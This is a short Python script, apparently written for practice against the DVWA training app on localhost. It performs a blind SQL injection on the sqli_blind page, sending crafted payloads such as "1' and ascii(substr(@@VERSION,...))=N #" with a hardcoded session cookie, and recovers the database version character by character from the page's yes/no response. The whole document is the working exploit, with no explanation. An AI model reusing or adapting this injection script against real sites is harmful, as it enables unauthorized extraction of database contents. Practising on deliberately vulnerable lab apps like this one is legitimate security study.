from pyexpat import version_info
import requests
from bs4 import BeautifulSoup
from urllib.parse import quote

LIMIT = 100
PHPSESSID = "mrkmml3bsf05ik17m4u7du5gj7"
SECURITY = "low"

def get_db_version_len():
    version_len = 0
    while True:
        version_len += 1
        base_url = "http://localhost/vulnerabilities/sqli_blind/?id="
        query=f"1' and length(@@VERSION)={version_len}#"
        url = base_url + quote(query) + "&Submit=Submit#"
        cookies = {"PHPSESSID":PHPSESSID, "security":SECURITY}
        response = requests.post(url, cookies=cookies)
        html_doc = response.content.decode()
        soup = BeautifulSoup(html_doc, 'html.parser')
        if soup.pre.text == "User ID exists in the database.":
            return version_len
        if version_len >= 100:
            raise ValueError(f'Tried {version_len} time but table len not found')   
        
def get_db_ver_char_ascii(digit):
    target_ascii = 0
    while True:
        target_ascii += 1
        base_url = "http://localhost/vulnerabilities/sqli_blind/?id="
        query = f"1' and ascii(substr(@@VERSION,{digit},1))={target_ascii} #"
        url = base_url + quote(query) + "&Submit=Submit#"
        cookies = {"PHPSESSID":PHPSESSID, "security":SECURITY}
        response = requests.post(url, cookies=cookies)
        html_doc = response.content.decode()
        soup = BeautifulSoup(html_doc, 'html.parser')
        if soup.pre.text == "User ID exists in the database.":
            return chr(target_ascii)
        if target_ascii > 127:
            raise ValueError(f'char not found on {digit}')

def get_db_ver(name_len):
    table_name = ""
    for idx in range(1, name_len + 1):
        table_name += get_db_ver_char_ascii(idx)
    return table_name

if __name__ == "__main__":
    db_version_len = get_db_version_len()
    db_version = get_db_ver(db_version_len)
    print(db_version)

    
    